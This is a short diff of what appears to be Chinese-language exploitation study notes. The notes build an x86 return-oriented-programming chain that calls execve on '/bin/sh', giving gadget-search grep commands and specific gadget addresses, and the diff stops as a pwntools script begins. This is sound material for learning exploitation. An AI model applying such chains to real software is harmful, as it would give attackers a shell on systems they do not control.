@@ -29,20 +29,20 @@ eax=0xb, ebx=address of "/bin/sh", ecx=0, edx=0
 4. gdb$ readelf 找buffer → .bss = 0x80eaf80, .data = 0x80ea060
 5. write to memory
     1. 找 mov dword ptr [reg], reg
-    cat dump | grep "mov dword ptr \[edx], eax" → 0x0809a15d : mov dword ptr [edx], eax ; ret
+    `cat dump | grep "mov dword ptr \[edx], eax"` → 0x0809a15d : mov dword ptr [edx], eax ; ret
     2. 找 pop edx
-    cat dump | grep "pop edx" → 0x0806e82a : pop edx ; ret
+    `cat dump | grep "pop edx"` → 0x0806e82a : pop edx ; ret
     3. 找 pop eax
-    cat dump | grep "pop eax" → 0x080bae06 : pop eax ; ret
+    `cat dump | grep "pop eax"` → 0x080bae06 : pop eax ; ret
 6. write to register
 
     找pop edx ; pop ecx ; pop ebx ; 
-    cat dump | grep "pop edx ; pop ecx ; pop ebx ;"→ 0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
+    `cat dump | grep "pop edx ; pop ecx ; pop ebx ;"`→ 0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
 
 7. system call
 
     找int 0x80
-    cat dump | grep "int 0x80" → 0x080493e1 : int 0x80
+    `cat dump | grep "int 0x80"` → 0x080493e1 : int 0x80
 
 ```python
 from pwn import *
